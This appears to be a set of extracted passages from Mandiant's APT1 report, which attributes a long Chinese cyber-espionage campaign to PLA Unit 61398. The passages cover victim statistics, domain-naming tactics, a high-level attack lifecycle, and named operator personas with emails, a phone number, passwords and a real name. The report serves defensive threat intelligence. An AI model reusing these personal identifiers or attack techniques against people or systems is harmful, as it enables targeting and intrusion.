              "text_verbatim": "# Naming Themes About half of APT1's known zones were named according to three themes: news, technology and business. These themes cause APT1 command and control addresses to appear benign at first glance. However, we believe that the hundreds of FQDNs within these zones were created for the purpose of APT1 intrusions. (Note: these themes are not unique to APT1 or even APT in general.) The news-themed zones include the names of well-known news media outlets such as CNN, Yahoo and Reuters. However, they also include names referencing English-speaking countries, such as \"aunewsonline.com\" (Australia), \"canadatvsite.com\" (Canada), and \"todayusa.org\" (U.S.). Below is a list of zones registered by APT1 that are news-themed: The technology-themed zones reference well-known technology companies (AOL, Apple, Google, Microsoft), antivirus vendors (McAfee, Symantec), and products (Blackberry, Bluecoat). APT1 also used more generic names referencing topics like software: Finally, some zones used by APT1 reflect a business theme. The names suggest websites that professionals might visit: Not every zone stays within APT1's control forever. Over a campaign lasting for so many years, APT1 has not always renewed every zone in their attack infrastructure. Additionally, while some have simply been allowed to expire, others have been transferred to the organizations that the domain names attempted to imitate. For example, in September 2011, Yahoo filed a complaint against \"zheng youjun\" of \"Arizona, USA\", who registered the APT1 zone \"myyahoonews.com\".37 Yahoo alleged the \"<myyahoonews.com> domain name was confusingly similar to Complainant's YAHOO! mark\" and that \"[zheng youjun] registered and used the <myyahoonews.com> domain name in bad faith.\" In response, the National Arbitration Forum found that the site \"myyahoonews.com\" at the time resolved Mandiant APT1 www.mandiant.com</myyahoonews.com></myyahoonews.com> to \"a phishing web page, substantially similar to the actual WorldSID website...in an effort to collect login credentials under false pretenses.\" Not surprisingly, \"zheng youjun\" did not respond. Subsequently, control of \"myyahoonews.com\" was transferred from APT1 to Yahoo.",

In our effort to underscore that there are actual individuals tasked by the PLA behind APT1's keyboards, we have decided to expose the identities of a select number of APT1 personas. These actors have made poor operational security choices, facilitating our research and allowing us to track their activities. They are some of the authors of APT1's digital weapons and the registrants of APT1 FQDNs and email accounts. These actors have expressed interest in China's cyber warfare efforts, disclosed their locations to be the Pudong New Area of Shanghai, and have even used a Shanghai mobile phone number to register email accounts used in spear phishing campaigns. Methods for attributing APT personnel often involve the synthesis of many small pieces of information into a singular comprehensive picture. Often this unified viewpoint reveals not only the group attribution, but coherent pockets of behavior within the group which we perceive to be either small teams or individual actors. We refer to these as \"personas.\" As APT1 personas manage technical resources such as hops and Fully Qualified Domain Names (FQDNs), they have been observed to de-conflict their actions amongst themselves by coordinating the use of specific hops, FQDNs, CNO tools (e.g., malware) and ports. One additional element working in our favor as threat trackers is the Great Firewall of China (GFWoC). Like many Chinese hackers, APT1 attackers do not like to be constrained by the strict rules put in place by the Communist Party of China (CPC), which deployed the GFWoC as a censorship measure to restrict access to web sites such as google.com, facebook.com, and twitter.com. Additionally, the nature of the hackers' work requires them to have control of network infrastructure outside the GFWoC. This creates a situation where the easiest way for them to log into Facebook and Twitter is directly from their attack infrastructure. Once noticed, this is an effective way to discover their real identities.",

The \"Great Firewall\" is a term used to describe the various technical methods used by the Chinese government to censor and block or restrict access to Internet services and content that the government considers sensitive or inappropriate. \"Inappropriate\" content ranges from pornography to political dissent, and from social media to news sites that may portray China or Chinese officials in a negative light. The \"Great Firewall\" uses methods such as blocking particular IP addresses; blocking or redirecting specific domain names; filtering or blocking any URL containing target keywords; and rate-limiting or resetting TCP connections. Chinese censors also routinely monitor Chinese websites, blogs, and social media for \"inappropriate\" content, removing it when found. As a result, Chinese citizens who wish to access censored content must resort to workarounds such as the use of encryption. China continues to improve and further restrict Internet access, most recently (in December 2012) by blocking additional services and limiting or blocking the use of encryption technologies such as Virtual Private Networks.

As Director of the “Military Technology and Equipment” (军事科技与装备) department at China's National Defense University (国防大学), professor Zhang was invited to take part in an event titled “Outlook 2004: The International Strategic Situation” in January 2004. During the online question and answer session hosted by the PLA Daily's (解放军报) China Military Online (中国军网), one young man with the nickname “Greenfield” (绿野) posed a particularly prescient question. “Professor Zhang, I read your book 'Network Warfare' and was deeply impressed by the views and arguments in the book. It is said that the U.S. military has set up a dedicated network force referred to as a 'cyber army.' Does China have a similar force? Does China have cyber troops?” — UglyGorilla 16 Jan 2004 Like all users of the China Military Online (chinamil) forums, “Greenfield” was required to sign up with an email address and specify a small bit of information about himself.

UG's consistent use of the username \"UglyGorilla\" across various Web accounts has left a thin but strong thread of attribution through many online communities. In most instances, content such as hacking tools, information security topics, and association with the Shanghai locality are reasonable ways to eliminate false positives.

DOTA may have taken his name from the video game “Defense of the Ancients” which is commonly abbreviated DotA, though we have yet to observe any direct link or other direct reference to the game. We have monitored the creation of dozens of accounts, including d0ta010@hotmail.com and dota.d013@gmail.com, and have often seen DOTA create several sequential accounts (for example dota.d001 through dota.d015) at web-based email services. Most often these accounts are used in social engineering and phishing attacks or as the contact email address when signing up for other services. For example, DOTA (originating from the APT1 home range IP address 58.247.26.59) with a Simplified Chinese keyboard setting used the email address “d0ta001@hotmail.com” from his US hop to register the Facebook user “do.ta.5011”(Facebook user id: 100002184628208). Some services, such as Google’s Gmail, require users to provide a phone number during the registration process to which they send a validation “text message” containing a verification code. The user must then input the verification code on the website to finalize registration. In an observed session on a compromised machine, DOTA used the phone number “159-2193-7229” to receive a verification text message from Google, which he then submitted to their page within seconds. Telephone numbers in China are organized into a hierarchy containing an area code, prefix, and line number similar to phone numbers in the United States, with the addition that a few area codes are allocated for use by mobile phone providers. The phone number “159-2193-7229” breaks down into the “159” area code, which indicates a mobile phone provided by China Mobile, and the prefix “2193”, which indicates a Shanghai mobile number. This means at the very least that the number was initially allocated by China Mobile for use in Shanghai. The speed of DOTA’s response also indicates that he had the phone with him at the time. We have also observed DOTA using the names Rodney and Raith to communicate via email in fluent English with various targets including South East Asian military organizations in Malaysia and the Philippines. It is unclear if this Gmail account is used exclusively for facilitating his CNO mission, but much of the traffic indicates its use in both simple phishing attacks, as well as more sophisticated email based social engineering.",

The DOTA persona also appears to be a fan of the popular “Harry Potter” character, frequently setting accounts “security questions” such as “Who is your favorite teacher?” and “Who is your best childhood friend?” to the values “Harry” and “Poter” and creating accounts such as poter.spo1@gmail.com with the alternate email address set to dota.sb005@gmail.com. Mandiant APT1 www.mandiant.com When creating dozens, or hundreds, of accounts in online communities and on victim systems, password management becomes a significant undertaking. Consequently, most APT1 attackers use passwords that are either pattern-based, such as the keyboard pattern \"1qaz2wsx\" or highly memorable, using \"rootkit\" as a password on the information security research site rootkit.com. Like many APT1 attackers, DOTA frequently uses keyboard based patterns as passwords such as \"1qaz@WSX#EDC\". However, there is one password \"2j3c1k\" extensively used by DOTA that is not based on a keyboard pattern, though he may not be the only APT1 actor that uses it. A numbered \"j\", followed by a numbered \"c\", and then a numbered \"k\" is likely shorthand (\"j\"/\"c\"/\"k\") for the ju/chu/ke (局/处/科) organizational structure (translated to Bureau/Division (or Office)/Section) widely used within PLA General Staff Department organizations. Project 2049 describes the typical PLA organizational structure as, \"Bureau-level directors ... oversee between six and 14 subordinate sites or offices [chu;处]... Sites/offices under bureaus are further divided into sections Mandiant APT1 www.mandiant.com [ke; 科].42 Given this pattern, it is likely that the password \"2j3c1k\" stands for 2nd Bureau [Unit 61398], 3rd Division, 1st Section, demonstrating that those who use these patterns are working together and affiliate themselves to the 2nd Bureau. Attempting to track the DOTA persona back to a particular individual is difficult; the trail of his activity does not link as clearly to a real world identity. However, Mandiant has been able to establish a clear link between UG and DOTA. Specifically, we have observed the two using shared APT1 infrastructure, FQDNs, and egress IP address ranges. The coordination of this shared infrastructure, combined with their close proximity and association with Unit 61398 makes it highly likely that, at the very least, UG and DOTA know each other personally and likely even work together.",

SH was first observed as a tool author, and is either the creator or a significant contributor to the AURIGA and BANGAT malware families (covered in Appendix C: The Malware Arsenal). Similarly to UG, SH signs much of his work by embedding strings within the tools. In particular, elements of the portable executable (PE) file's VS_VERSIONINFO structure are frequently set to \"SuperHard,\" or cmd.exe copies are modified from \"Microsoft corp.\" to \"superhard corp.\" Additionally, many of SH's tools contain driver modules designed to be loaded into the Windows kernel in order to subvert elements of the system. While not unique for APT1 coders, this level of development expertise is certainly a discriminator that puts SH into a smaller group of highly capable developers within APT1. Often, SH's tools are observed in use by other APT1 personae and in several instances, other APT groups we track. Given that SH's tools are used by other APT1 actors, and that there are no indications that SH is a full-time operator, we believe that SH is primarily involved in research and development for APT1. Once again, in tracking SH we are fortunate to have access to the accounts disclosed from rootkit.com.

We have observed the DOTA persona emailing someone with the username mei_qiang_82. The name \"Mei Qiang\" (梅强) is a reasonably common Chinese last/first name combination. Additionally, it is a common practice for Chinese netizens to append the last two digits of their birth year, suggesting that SuperHard is in fact Mei Qiang and was born in 1982. Unfortunately, there are several \"Mei Qiang\" identities online that claim a birth year of 1982, making attribution to an individual difficult. Fortunately, we can use SH's email address to connect him to a number of Websites and forums on which he registered and contributed using that address. Many of these accounts reveal details that reinforce SH's link to the \"mei_qiang_82@sohu.com\"43 email address and APT1 affiliation, such as SH offering to write Trojans for money, his involvement with malicious Windows kernel research (incidentally, also commented on by \"greenfield\", possibly UG), and more recently, being local to Shanghai's Pudong New Area.44 Mandiant APT1 www.mandiant.com",

The detection and awareness of APT1 is made even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this report. Therefore the most probable conclusion is that APT1 is able to wage such a long-running and extensive cyber espionage campaign because it is acting with the full knowledge and cooperation of the government. Given the mission, resourcing, and location of PLA Unit 61398, we conclude that PLA Unit 61398 is APT1. Table 12 summarizes the parallels between APT1 and PLA Unit 61398. » Size of “hop” infrastructure and continuous malware updates suggest at least dozens (but probably hundreds) of operators with hundreds of support personnel | » As part of the PLA, has the resources (people, money, influence) necessary to orchestrate operation at APT1’s scale » Has hundreds, perhaps thousands of people, as suggested by the size for their facilities and position within the PLA | Mandiant APT1 www.mandiant.com • Malware authoring • Computer hacking • Ability to identify data worth stealing in 20 industries | • English language requirements • Operating system internals, digital signal processing, steganography • Recruiting from Chinese technology universities | • Two of four “home” Shanghai net blocks are assigned to the Pudong New Area • Systems used by APT1 intruders have Simplified Chinese language settings Combining our direct observations with carefully researched and correlated findings; we believe the facts dictate only two possibilities:",

              "text_verbatim": "# APPENDIX A: HOW DOES MANDIANT DISTINGUISH THREAT GROUPS? Mandiant uses the term *threat group* to refer to a collection of intruders who are working together to target and penetrate networks of interest. These individuals may share the same set of tasks, coordinate their targets, and share tools and methodology. They work together to gain access to their targets and steal data. Therefore, a group is ultimately defined by people and not by methodology. However, defining a threat group based on observed intrusion activity is not so simple. Without seeing who is sitting behind the keyboard it may be difficult to determine whether two different intrusion events were conducted by the same person, by two people who are working together, by two unrelated people who independently compromised the same network, or even the same computer. Different groups may use similar intrusion methodology and common tools, particularly those that are widely available on the Internet, such as pwdump, HTRAN, or Gh0st RAT. Furthermore, there may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing of personnel. Individual intruders may move between groups either temporarily or permanently. An intruder may be a private citizen who is hired by multiple groups. Finally, multiple groups may work together on occasion to compromise the same target. Nevertheless, distinguishing one threat group from another is possible with enough information, analytical experience, and the technological tools to piece it all together. Consider an analogy with the physical world: imagine a thief who leaves behind traces of his crime at various crime scenes. Individual robberies may vary in many details: - The method the thief used to break in; - The tools used to open the safe; - Whether the thief carefully selected a particular item to steal, or took everything in the hope that he managed to grab something of value; - Whether the thief carefully researched their target, disabled alarms, and attempted to remove evidence such as fingerprints; or whether he was not very careful, but simply relied on being \"stealthy enough\" to not get caught. Forensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime scene was the result of one thief and not another. In a similar way, cyber intruders leave behind various digital \"fingerprints.\" They may send spear-phishing emails from a specific IP address or email address. Their emails may contain certain patterns of subject lines. Their files have specific names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have command and control IP addresses or domain names embedded. These are just a few examples of the myriad of linkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another. Digital \"fingerprints\" do not all carry equal weight in attribution analysis. Their validity or value as indicators of a specific threat group depends largely on their likelihood of uniqueness. For example, the use of a widely available tool such as HTRAN is not unique and not useful — by itself — as an indicator of a specific threat group",

The stages between \"Establish Foothold\" and \"Complete Mission\" do not have to occur in this order every time.

Spear phishing messages may contain malicious attachments, a link to a malicious file, or a link to a malicious website. Less commonly, APT intruders may attempt to contact potential victims and send malicious content via social networking sites or instant messaging. Another common tactic is strategic web compromise, in which the attacker places malicious code on websites that people in targeted organizations will likely visit. When they visit these websites in the course of their normal duties, they will be compromised if their computer is vulnerable to the attacker's exploit code. APT groups may also look for vulnerable Internet-facing web servers and upload webshells in order to gain access to a targets internal network, or look for other technical vulnerabilities in public-facing infrastructure.",

These backdoors usually establish an outbound connection from the victim network to a computer controlled by the attackers.

APT intruders (and intruders in general) prefer to leverage privileged accounts where possible, such as Domain Administrators, service accounts with Domain privileges, local Administrator accounts, and privileged user accounts. This is typically accomplished by first \"dumping\" password hashes from a computer, server, or (preferably) Domain Controller. The attacker may be able to obtain legitimate account passwords by \"cracking\" password hashes. Alternately, the attacker may leverage the hashes themselves in a \"pass-the-hash\" attack, where the hashed password itself may be used for authentication in lieu of the actual password.

Since the United States uses the prefix \"+\" it is highly unlikely that a person living in Ohio would provide a phone number beginning with \"+86\". Additionally, the city name is spelled incorrectly, as it should be \"Yellow Springs\" instead of \"Yellow Spring\". This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name incorrectly multiple times, both for the zones \"uszzcs.com\" and \"attnpower.com\". This suggests that the registrant really thought \"Yellow Spring\" was the correct spelling and that he or she did not, in fact, live or work in Yellow Springs, Ohio.",

The rootkit.com account \"SuperHard_M\" was originally registered from the IP address 58.247.237.4, within one of the known APT1 egress ranges, and using the email address \"mei_qiang_82@sohu.com\". We have observed the DOTA persona emailing someone with the username mei_qiang_82. The name \"Mei Qiang\" (梅强) is a reasonably common Chinese last/first name combination. Additionally, it is a common practice for Chinese netizens to append the last two digits of their birth year, suggesting that SuperHard is in fact Mei Qiang and was born in 1982. Unfortunately, there are several \"Mei Qiang\" identities online that claim a birth year of 1982, making attribution to an individual difficult.",

Therefore the most probable conclusion is that APT1 is able to wage such a long-running and extensive cyber espionage campaign because it is acting with the full knowledge and cooperation of the government.

The FQDNs play an important role in their intrusion campaigns because APT1 embeds FQDNs as C2 addresses within their backdoors. In the last several years we have confirmed 2,551 FQDNs attributed to APT1. Of these, we have redacted FQDNs that implicated victims by name and provided 2,046 in Appendix D. By using FQDNs rather than hard-coded IP addresses as C2 addresses, attackers may dynamically decide where to direct C2 connections from a given backdoor. That is, if they lose control of a specific hop point (IP address) they can \"point\" the C2 FQDN address to a different IP address and resume their control over victim backdoors. This flexibility allows the attacker to direct victim systems to myriad C2 servers and avoid being blocked.",

              "content": "# EXECUTIVE SUMMARY Since 2004, Mandiant has investigated computer security breaches at hundreds of organizations around the world. The majority of these security breaches are attributed to advanced threat actors referred to as the “Advanced Persistent Threat” (APT). We first published details about the APT in our January 2010 M-Trends report. As we stated in the report, our position was that “The Chinese government may authorize this activity, but there’s no way to determine the extent of its involvement.” Now, three years later, we have the evidence required to change our assessment. The details we have analyzed during hundreds of investigations convince us that the groups conducting these activities are based primarily in China and that the Chinese Government is aware of them.³ Mandiant continues to track dozens of APT groups around the world; however, this report is focused on the most prolific of these groups. We refer to this group as “APT1” and it is one of more than 20 APT groups with origins in China. APT1 is a single organization of operators that has conducted a cyber espionage campaign against a broad range of victims since at least 2006. From our observations, it is one of the most prolific cyber espionage groups in terms of the sheer quantity of information stolen. The scale and impact of APT1’s operations compelled us to write this report. The activity we have directly observed likely represents only a small fraction of the cyber espionage that APT1 has conducted. Though our visibility of APT1’s activities is incomplete, we have analyzed the group’s intrusions against nearly 150 victims over seven years. From our unique vantage point responding to victims, we tracked APT1 back to four large networks in Shanghai, two of which are allocated directly to the Pudong New Area. We uncovered a substantial amount of APT1’s attack infrastructure, command and control, and modus operandi (tools, tactics, and procedures). In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three personas we have attributed to APT1. These operators, like soldiers, may merely be following orders given to them by others. Our analysis has led us to conclude that APT1 is likely government-sponsored and one of the most persistent of China’s cyber threat actors. We believe that APT1 is able to wage such a long-running and extensive cyber espionage campaign in large part because it receives direct government support. In seeking to identify the organization behind this activity, our research found that People’s Liberation Army (PLA’s) Unit 61398 is similar to APT1 in its mission, capabilities, and resources. PLA Unit 61398 is also located in precisely the same area from which APT1 activity appears to originate. ³ Our conclusions are based exclusively on unclassified, open source information derived from Mandiant observations. None of the information in this report involves access to or confirmation by classified intelligence. Mandiant APT1 www.mandiant.com"

              "content": "# KEY FINDINGS APT1 is believed to be the 2nd Bureau of the People's Liberation Army (PLA) General Staff Department's (GSD) 3rd Department (总参三部二局), which is most commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398 (61398部队). - The nature of “Unit 61398's” work is considered by China to be a state secret; however, we believe it engages in harmful “Computer Network Operations.” - Unit 61398 is partially situated on Datong Road (大同路) in Gaoqiaozhen (高桥镇), which is located in the Pudong New Area (浦东新区) of Shanghai (上海). The central building in this compound is a 130,663 square foot facility that is 12 stories high and was built in early 2007. - We estimate that Unit 61398 is staffed by hundreds, and perhaps thousands of people based on the size of Unit 61398's physical infrastructure. - China Telecom provided special fiber optic communications infrastructure for the unit in the name of national defense. - Unit 61398 requires its personnel to be trained in computer security and computer network operations and also requires its personnel to be proficient in the English language. - Mandiant has traced APT1's activity to four large networks in Shanghai, two of which serve the Pudong New Area where Unit 61398 is based. APT1 has systematically stolen hundreds of terabytes of data from at least 141 organizations, and has demonstrated the capability and intent to steal from dozens of organizations simultaneously.⁴ - Since 2006, Mandiant has observed APT1 compromise 141 companies spanning 20 major industries. - APT1 has a well-defined attack methodology, honed over years and designed to steal large volumes of valuable intellectual property. - Once APT1 has established access, they periodically revisit the victim's network over several months or years and steal broad categories of intellectual property, including technology blueprints, proprietary manufacturing processes, test results, business plans, pricing documents, partnership agreements, and emails and contact lists from victim organizations' leadership. - APT1 uses some tools and techniques that we have not yet observed being used by other groups including two utilities designed to steal email — GETMAIL and MAPIGET. - APT1 maintained access to victim networks for an average of 356 days.⁵ The longest time period APT1 maintained access to a victim's network was 1,764 days, or four years and ten months. - Among other large-scale thefts of intellectual property, we have observed APT1 stealing 6.5 terabytes of compressed data from a single organization over a ten-month time period. - In the first month of 2011, APT1 successfully compromised at least 17 new victims operating in 10 different industries. ⁴ We believe that the extensive activity we have directly observed represents only a small fraction of the cyber espionage that APT1 has conducted. Therefore, Mandiant is establishing the lower bounds of APT1 activities in this report. ⁵ This is based on 91 of the 141 victim organizations. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into the last known date of APT1 activity in the network. Mandiant APT1 www.mandiant.com APT1 focuses on compromising organizations across a broad range of industries in English-speaking countries. - Of the 141 APT1 victims, 87% of them are headquartered in countries where English is the native language"

              "content": ". - The industries APT1 targets match industries that China has identified as strategic to their growth, including four of the seven strategic emerging industries that China identified in its 12th Five Year Plan. APT1 maintains an extensive infrastructure of computer systems around the world. - APT1 controls thousands of systems in support of their computer intrusion activities. - In the last two years we have observed APT1 establish a minimum of 937 Command and Control (C2) servers hosted on 849 distinct IP addresses in 13 countries. The majority of these 849 unique IP addresses were registered to organizations in China (709), followed by the U.S. (109). - In the last three years we have observed APT1 use fully qualified domain names (FQDNs) resolving to 988 unique IP addresses. - Over a two-year period (January 2011 to January 2013) we confirmed 1,905 instances of APT1 actors logging into their attack infrastructure from 832 different IP addresses with Remote Desktop, a tool that provides a remote user with an interactive graphical interface to a system. - In the last several years we have confirmed 2,551 FQDNs attributed to APT1. In over 97% of the 1,905 times Mandiant observed APT1 intruders connecting to their attack infrastructure, APT1 used IP addresses registered in Shanghai and systems set to use the Simplified Chinese language. - In 1,849 of the 1,905 (97%) of the Remote Desktop sessions APT1 conducted under our observation, the APT1 operator's keyboard layout setting was “Chinese (Simplified) — US Keyboard”. Microsoft’s Remote Desktop client configures this setting automatically based on the selected language on the client system. Therefore, the APT1 attackers likely have their Microsoft® operating system configured to display Simplified Chinese fonts. - 817 of the 832 (98%) IP addresses logging into APT1 controlled systems using Remote Desktop resolved back to China. - We observed 767 separate instances in which APT1 intruders used the “HUC Packet Transmit Tool” or HTRAN to communicate between 614 distinct routable IP addresses and their victims’ systems using their attack infrastructure. Of the 614 distinct IP addresses used for HTRAN communications: - 614 of 614 (100%) were registered in China. - 613 (99.8%) were registered to one of four Shanghai net blocks. Mandiant APT1 www.mandiant.com Mandiant APT1 www.mandiant.com The size of APT1's infrastructure implies a large organization with at least dozens, but potentially hundreds of human operators. - We conservatively estimate that APT1's current attack infrastructure includes over 1,000 servers. - Given the volume, duration and type of attack activity we have observed, APT1 operators would need to be directly supported by linguists, open source researchers, malware authors, industry experts who translate task requests from requestors to the operators, and people who then transmit stolen information to the requestors. - APT1 would also need a sizable IT staff dedicated to acquiring and maintaining computer equipment, people who handle finances, facility management, and logistics (e.g., shipping). In an effort to underscore that there are actual individuals behind the keyboard, Mandiant is revealing three personas that are associated with APT1 activity. - The first persona, \"UglyGorilla\", has been active in computer network operations since October 2004"

However, we admit there is one other unlikely possibility: A secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign right outside of Unit 61398's gates, performing tasks similar to Unit 61398's known mission."

What started as a \"what if\" discussion about our traditional non-disclosure policy quickly turned into the realization that the positive impact resulting from our decision to expose APT1 outweighed the risk to our ability to collect intelligence on this particular APT group. It is time to acknowledge the threat is originating in China, and we wanted to do our part to arm and prepare security professionals to combat that threat effectively. The issue of attribution has always been a missing link in publicly understanding the landscape of APT cyber espionage. Without establishing a solid connection to China, there will always be room for observers to dismiss APT actions as uncoordinated, solely criminal in nature, or peripheral to larger national security and global economic concerns. We hope that this report will lead to increased understanding and coordinated action in countering APT network breaches. At the same time, there are downsides to publishing all of this information publicly. Many of the techniques and technologies described in this report are vastly more effective when attackers are not aware of them. Additionally, publishing certain kinds of indicators dramatically shortens their lifespan. When Unit 61398 changes their techniques after reading this report, they will undoubtedly force us to work harder to continue tracking them with such accuracy. It is our sincere hope, however, that this report can temporarily increase the costs of Unit 61398's operations and impede their progress in a meaningful way. We are acutely aware of the risk this report poses for us. We expect reprisals from China as well as an onslaught of criticism. Mandiant APT1 www.mandiant.com"

The CPC is the ultimate authority in Mainland China; unlike in Western societies, in which political parties are subordinate to the government, the military and government in China are subordinate to the CPC. In fact, the PLA reports directly to the CPC's Central Military Commission (CMC, 中央军事委员会). This means that any enterprise cyber espionage campaign within the PLA is occurring at the direction of senior members of the CPC. We believe that the PLA's strategic cyber command is situated in the PLA's General Staff Department (GSD,总参谋部), specifically its 3rd Department (总参三部). The GSD is the most senior PLA department. Similar to the U.S. Joint Chiefs of Staff, the GSD establishes doctrine and provides operational guidance for the PLA.

Additionally, the memo clarifies the phrase \"Unit 61398\" with the comment \"(GSD 3rd Department, 2nd Bureau).\" The memo not only supports the identity of Unit 61398 as GSD's 3rd Department 2nd Bureau, but also reveals the relationship between a \"very important communication and control department\" (Unit 61398) and a state-influenced enterprise. ²² Confirmation of several other Unit 61398 support facilities along Datong Road: Address: 上海市浦东新区大同路50号 (Pudong New Area, Shanghai, Datong Road 50) Building Name: 中国人民解放军第61398部队司令部 (People's Liberation Army Unit 61398 Headquarters) Source: Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%91%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%B8%A4%E9%83%A8, accessed February 6, 2013.

This bureau already placed fiber-optic cable at the East Gate front entrance [road pole]. They need to use two ports to enter our company's East Gate communication channel. The length is about 30m. At the same time, the second stage construction (in Gaoqiao Base) needs to enter into our company's Shanghai Nanhui Communication Park 005 Center (special-use bureau). This military fiber-optic cable has already been placed at the Shanghai Nanhui Communication Park entrance. They need to use 4 of our company ports inside the Nanhui Communication Park to enter. The length is 600m. Upon our division's negotiation with the 3rd Department 2nd Bureau's communication branch, the military has promised to pay at most 40,000 Yuan for each port. They also hope Shanghai Telecom will smoothly accomplish this task for the military based on the principle that national defense construction is important. After checking the above areas' channels, our company has a relatively abundant inventory to satisfy the military's request. This is our suggestion: because this is concerning defense construction, and also the 3rd Department 2nd Bureau is a very important communication control department, we agree to provide the requested channels according to the military's suggested price. Because this is a one-time payment, and it is difficult to use the normal renting method, we suggest our company accept one-time payment using the reason of \"Military Co-Construction [with China Telecom] of Communication Channels\" and provide from our inventory.

Remarkably, we have witnessed APT1 target dozens of organizations simultaneously. Once the group establishes access to a victim's network, they continue to access it periodically over several months or years to steal large volumes of valuable intellectual property, including technology blueprints, proprietary manufacturing processes, test results, business plans, pricing documents, partnership agreements, emails and contact lists from victim organizations' leadership.

Figure 10 shows the timeline of the 141 compromises we are aware of; each marker in the figure represents a separate victim and indicates the earliest confirmed date of APT1 activity in that organization's network.²⁶ With the ephemeral nature of electronic evidence, many of the dates of earliest known APT1 activity shown here underestimate the duration of APT1's presence in the network. ²⁶ Figure 10 shows that we have seen APT1 compromise an increasing number of organizations each year, which may reflect an increase in APT1's activity. However, this increase may also simply reflect Mandiant's expanding visibility into APT1's activities as the company has grown and victims' awareness of cyber espionage activity in their networks has improved. Longest time period within which APT1 has continued to access a victim's network: 4 Years, 10 Months Once APT1 has compromised a network, they repeatedly monitor and steal proprietary data and communications from the victim for months or even years. For the organizations in Figure 10, we found that APT1 maintained access to the victim's network for an average of 356 days.²⁷ The longest time period APT1 maintained access to a victim's network was at least 1,764 days, or four years and ten months. APT1 was not continuously active on a daily basis during this time period; however, in the vast majority of cases we observed, APT1 continued to commit data theft as long as they had access to the network."

              "content": "## APT1’s Geographic &amp; Industry Focus The organizations targeted by APT1 primarily conduct their operations in English. However, we have also seen the group target a small number of non-English speaking victims. A full 87% of the APT1 victims we have observed are headquartered in countries where English is the native language (see Figure 11). This includes 115 victims located in the U.S. and seven in Canada and the United Kingdom. Of the remaining 19 victims, 17 use English as a primary language for operations. These include international cooperation and development agencies, foreign governments in which English is one of multiple official languages, and multinational conglomerates that primarily conduct their business in English. Only two victims appear to operate using a language other than English. Given that English-language proficiency is required for many members of PLA Unit 61398, we believe that the two non-English speaking victims are anomalies representing instances in which APT1 performed tasks outside of their normal activities. ²⁷ This is based on 91 of the 141 victim organizations shown. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into the last known date of APT1 activity in the network. Mandiant APT1 www.mandiant.com APT1 has demonstrated the capability and intent to steal from dozens of organizations across a wide range of industries virtually simultaneously. Figure 12 provides a view of the earliest known date of APT1 activity against all of the 141 victims we identified, organized by the 20 major industries they represent. The results suggest that APT1's mission is extremely broad; the group does not target industries systematically but more likely steals from an enormous range of industries on a continuous basis. Since the organizations included in the figure represent only the fraction of APT1 victims that we confirmed directly, the range of industries that APT1 targets may be even broader than our findings suggest. Further, the scope of APT1's parallel activities implies that the group has significant personnel and technical resources at its disposal. In the first month of 2011, for example, Figure 12 shows that APT1 successfully compromised 17 new victims operating in 10 different industries. Since we have seen that the group remains active in each victim's network for an average of nearly a year after the initial date of compromise, we infer that APT1 committed these 17 new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously compromised victims. Mandiant APT1 www.mandiant.com TIMELINE OF APT1 COMPROMISES BY INDUSTRY SECTOR Mandiant APT1 www.mandiant.com We believe that organizations in all industries related to China's strategic priorities are potential targets of APT1's comprehensive cyber espionage campaign. While we have certainly seen the group target some industries more heavily than others (see Figure 13), our observations confirm that APT1 has targeted at least four of the seven strategic emerging industries that China identified in its 12th Five Year Plan.²⁸ Mandiant APT1 www.mandiant.com"

              "content": "# APT1 Data Theft APT1 steals a broad range of information from its victims. The types of information the group has stolen relate to: - product development and use, including information on test results, system designs, product manuals, parts lists, and simulation technologies; - manufacturing procedures, such as descriptions of proprietary processes, standards, and waste management processes; - business plans, such as information on contract negotiation positions and product pricing, legal events, mergers, joint ventures, and acquisitions; - policy positions and analysis, such as white papers, and agendas and minutes from meetings involving high-ranking personnel; - emails of high-ranking employees; and - user credentials and network architecture information. It is often difficult for us to estimate how much data APT1 has stolen during their intrusions for several reasons: - APT1 deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually overwritten during normal business activities. - Pre-existing network security monitoring rarely records or identifies the data theft. - The duration of time between the data theft and Mandiant's investigation is often too great, and the trace evidence of data theft is overwritten during the normal course of business. - Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating and understanding the impact of the security breach. Even with these challenges, we have observed APT1 steals as much as 6.5 terabytes of compressed data from a single organization over a ten-month time period. Given the scope of APT1's operations, including the number of organizations and industries we have seen them target, along with the volume of data they are clearly capable of stealing from any single organization, APT1 has likely stolen hundreds of terabytes from its victims. &gt; Largest APT1 data theft from a single organization: &gt; 6.5 Terabytes &gt; over 10 months Although we do not have direct evidence indicating who receives the information that APT1 steals or how the recipient processes such a vast volume of data, we do believe that this stolen information can be used to obvious advantage by the PRC and Chinese state-owned enterprises. As an example, in 2008, APT1 compromised the network of a company involved in a wholesale industry. APT1 installed tools to create compressed file archives and to extract emails and attachments. Over the following 2.5 years, APT1 stole an unknown number of files from the victim and repeatedly accessed the email accounts of several executives, including the CEO and General Counsel. During this same time period, major news organizations reported that China had successfully negotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities. This may be coincidental; however, it would be surprising if APT1 could continue perpetrating such a broad mandate of cyber espionage and data theft if the results of the group's efforts were not finding their way into the hands of entities able to capitalize on them.

